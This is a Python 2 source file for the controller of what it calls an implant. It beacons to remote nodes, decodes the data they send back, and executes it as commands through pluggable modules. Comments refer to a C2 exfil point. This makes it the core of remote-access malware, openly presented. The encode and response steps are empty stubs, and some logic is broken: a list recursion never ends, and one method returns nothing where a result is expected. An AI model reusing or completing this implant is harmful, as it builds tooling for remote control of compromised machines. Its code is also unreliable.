#!/usr/bin/env python

#
# This is the application controller that manages the calls through all the different types of modules
#

import inspect
import sys
import warnings
from socket import error as socket_error

# TODO:
#
# - Parse XML to build mappings
# - Considering wrapping each node into a Node class upon initial import.
# - Fix easy_import and abstract_builder so you can hand it a list of the modules for a package (beacons, commands, etc), since the import can receive a list. More efficient.

PROMP_SEP = "->"
PROMP_BASE = "[Controller"
PROMP_END = "]>"
BASIC_PROMPT = PROMP_BASE + PROMP_END
BEAC_PROMPT = PROMP_BASE + PROMP_SEP + 'Beaconer' + PROMP_END
DEC_PROMPT = PROMP_BASE + PROMP_SEP + 'Decoder' + PROMP_END
CMD_PROMPT = PROMP_BASE + PROMP_SEP + 'Commander' + PROMP_END
ENC_PROMPT = PROMP_BASE + PROMP_SEP + 'Encoder' + PROMP_END
RESP_PROMPT = PROMP_BASE + PROMP_SEP + 'Responder' + PROMP_END

BEACON_TYPE_IND = 0
PARAMS_IND = 1
MODULE_PATH = 'implant_modules'
BEACON_PKG = MODULE_PATH + '.' + 'beacons'
COMMAND_PKG = MODULE_PATH + '.' +'commands'
DECODER_PKG = MODULE_PATH + '.' +'codecs'
ENCODER_PKG = MODULE_PATH + '.' + 'codecs'
RESPONDER_PKG = MODULE_PATH + '.' + 'responders'

KEY_KEY = 'key'
VAL_KEY = 'val'
CMD_SUCC_KEY = 'success'
CMD_RES_KEY = 'results'
NODE_IP_KEY = 'node'
NODE_PORT_KEY = 'port'

class Controller:
    
    beacon_map = {}
    decoder_list = {} # list
    command_map = {}
    encoder_list = {} # list
    response_map = {}
    
    def __init__(self, beacons, commands, decoders, encoders, responders):
        
        if len(encoders) == 0:
            encoders = reversed(decoders)
        
        self.build_handlers(beacons, commands, decoders, encoders, responders)
    
    # ###############
    # UTILITIES
    # ###############
    
    def get_module_class(self, module):
        try:
            for name, obj in inspect.getmembers(module):
                # must check for parent module name as to avoid imported class objects
                if inspect.isclass(obj) and obj.__module__ == module.__name__:
                    return obj
                    # have it instantiate the object? depends where I decide to use this method: obj_() creates an instance.
        except Exception, e:
            print "Error getting class from %s module" % (module.__name__)
            raise

    def easy_import(self, pkg_name, module_name):
        
        try:
            pkg = __import__(pkg_name, fromlist=[module_name])
            module = getattr(pkg,module_name)
            return self.get_module_class(module)
        except ImportError ,e:
            print "Erorr importing %s from %s" % (module_name, pkg_name)
            raise
    
    def abstract_builder(self, pkg_name, name_list, return_list = False):
        
        if return_list:
            ret_val = []
        else:
            ret_val = {}
        
        for module_name in name_list:

            module_class = self.easy_import(pkg_name, module_name)
            if return_list:
                ret_val.append(module_class)
            else:
                ret_val[module_name] = module_class
            
        return ret_val
    
    # ###############    
    # HANDLER BUILDERS
    # ###############
    
    # Note:
    # I added these facades because I am unsure how this architecture will work in the long run.
    # Hence, I am using a ludicrous number of functions and facades.
    
    def build_beacon_handler(self, beacons):
        
        self.beacon_map = self.abstract_builder(BEACON_PKG, beacons)

    def build_command_handler(self, commands):
        
        self.command_map = self.abstract_builder(COMMAND_PKG, commands)
    
    def build_decoder_handler(self, decoders):
        
        self.decoder_list = self.abstract_builder(DECODER_PKG, decoders, True) #return a list
        
    def build_encoder_handler(self, encoders):
        
        self.encoder_list = self.abstract_builder(ENCODER_PKG, encoders, True) #return a list
        
    def build_responder_handler(self, responders):
    
        self.response_map = self.abstract_builder(RESPONDER_PKG, responders)
    
    def build_handlers(self, beacons, commands, decoders, encoders, responders):
        # this function is used by the constructor to setup the dictionaries with the command to command object mapping.
        
        self.build_beacon_handler(beacons)
        self.build_command_handler(commands)
        self.build_decoder_handler(decoders)
        self.build_encoder_handler(encoders)
        self.build_responder_handler(responders)
    
    # ###############
    # HANDLER CALLERS
    # ###############
    
    def handle_beacon(self, nodes):
        # 
        # nodes example:
        # list of tuples, where each tuples first value is a string of the beacon type and second value is a dictionary of arguments
        # [('http_get',{'node':'192.168.2.2','port':'80','path':'/index.html','timeout':'10'})]
        #
        
        print BEAC_PROMPT + " beaconing..."
        
        try:
            
            success = False
            # Should I randomize the order of nodes?
            for node in nodes:
                beacon_type = node[BEACON_TYPE_IND]
                params = node[PARAMS_IND]
                
                ip = params.get(NODE_IP_KEY)
                port = params.get(NODE_PORT_KEY)
        
                beaconer_class = self.beacon_map.get(beacon_type) # get this from the beacon map based on beacon type
                beaconer = beaconer_class() # instantiate the object
                try:
                    success, response = beaconer.beacon(params)
                except Exception, e:
                    print "%s Error connecting to %s:%s" % (BEAC_PROMPT, ip, port)
                    success = False
                
                if success:
                    print "%s Successfully retrieved data from %s:%s" % (BEAC_PROMPT, ip, port)
                    return (success, response)
                else:
                    # Will not all failures raise an exception? Perahsp this should be forced implementation by all Beaconers?
                    # print "%s Failed to retrieve data from %s:%s" % (BEAC_PROMPT, ip, port)
                    # Should I pause here or just continue?
                    pass
                
            # What do I do if none of the nodes worked?
            return (False, None)
        except TypeError as e:
            print "No such class for provided beacon type: %s" % (beacon_type)
            raise e
        except Exception,e :
            raise e
    
    def recursive_decoder(self, decoder, encoded_data):
        
        decoded_data = []
        
        success = True
        
        try:
            
            if type(encoded_data) is str:
                decoded_data.append(decoder.decode(encoded_data))
                return success, decoded_data
            
            for encoded_portion in encoded_data:
                
                portion_type = type(encoded_portion)

                if portion_type is dict:
                    
                    decoded_portion = {}
                    for encoded_key, encoded_value in encoded_portion.items():
                        decoded_key = decoder.decode(encoded_key)
                        
                        if type(encoded_value) is list or type(encoded_value) is dict:
                            success, data = self.recursive_decoder(decoder, encoded_value)
                            decoded_value = data
                        else:
                            decoded_value = decoder.decode(encoded_value)
                            
                        decoded_portion[KEY_KEY] = decoded_key
                        decoded_portion[VAL_KEY] = decoded_value
                        
                    decoded_data.append(decoded_portion)
                    
                elif portion_type is list or portion_type is tuple or portion_type is str:
                    
                    success, data = self.recursive_decoder(decoder, encoded_portion)
                    if success:
                        decoded_data.append(data)
                    else:
                        return (False, None)
                    
                
                else:
                    print DEC_PROMPT + 'Data was not formatted as dict, list/tuple!'
                    raise
            
            ## NOTE: If nested multiple commands breaks, this is likely the culprit
            if len(encoded_data) == 1:
                decoded_data = decoded_data[0]
                
        except Exception, e:
                print e
                print DEC_PROMPT + " Issue in %s decoder while trying to decode %s " % (decoder.name(), encoded_data)
                return (False, None)
        
        return success, decoded_data
    
    def handle_decode(self, encoded_data):
        
        print DEC_PROMPT + " decoding..."
        
        # while there is another decoder, run each item through the next decoder
        data = encoded_data
        success = False
        for decoder in self.decoder_list:
            current_decoder = decoder()
            success, data = self.recursive_decoder(current_decoder, data)
            if not success:
                break
            print DEC_PROMPT + "%s decoded to '%s'" % ( current_decoder.name(),data)
        return success, data
    
    def recursive_execute(self, command):
        type_check = type(command)
        
        agg_results = []
        
        if type_check is dict:
            cmd_class = self.command_map.get(command[KEY_KEY])
            cmd_obj = cmd_class()
            success, results = cmd_obj.execute(command[VAL_KEY])
            
            cur_results = {}
            cur_results[CMD_SUCC_KEY] = success
            cur_results[CMD_RES_KEY] = results
            agg_results.append(cur_results)
            
        elif type_check is list:
            success, results = self.recursive_execute(command)
            # not doing anything with success here
            agg_results.append(results)
        else:
            print CMD_PROMPT + " Improper formatted command: %s" % (command)
            
        return success, agg_results
    
    def handle_command(self, commands):
        print CMD_PROMPT + " calling commands..."
        
        for command in commands:
            success, result = self.recursive_execute(command)
            # Is there going to be complex results checking and handling code?

        # check results for threads, if there are, add them to a pool to be tracked
    
    def handle_encode(self, results):
        print ENC_PROMPT + " encoding results..."
        pass
    
    def handle_response(self, encoded_results):
        print RESP_PROMPT + " sending results..."
        pass
    
    def handle(self, nodes):
        
        try:
            # Send command to beacon handler
            success, encoded_data = self.handle_beacon(nodes)
            
            # Send response to decoders
            if success:
                success, decoded_data = self.handle_decode(encoded_data)
            else:
                return False 
            
            # Process command
            if success:
                success, results = self.handle_command(decoded_data)
            else:
                return False
            
            # encode response here
            if success:
                success, encoded_results = self.handle_encode(results)
            else:
                return False
            
            # Send response
            if success:
                success = self.handle_response(encoded_results)
            else:
                return False
            
        
        except Exception, e:
            # Here consider sending back a message to the C2 exfil point, letting them know why the implant died
            # if so, replace the return statements with raise statements and define appropriate exceptions with mesages
            raise e
            
    
    def beacon(self, nodes):
        # facade
        result = self.handle(nodes)
        print "%s Beaconing iteration %s" % (BASIC_PROMPT,("FAILED", "SUCCEEDED")[result]) 
    
    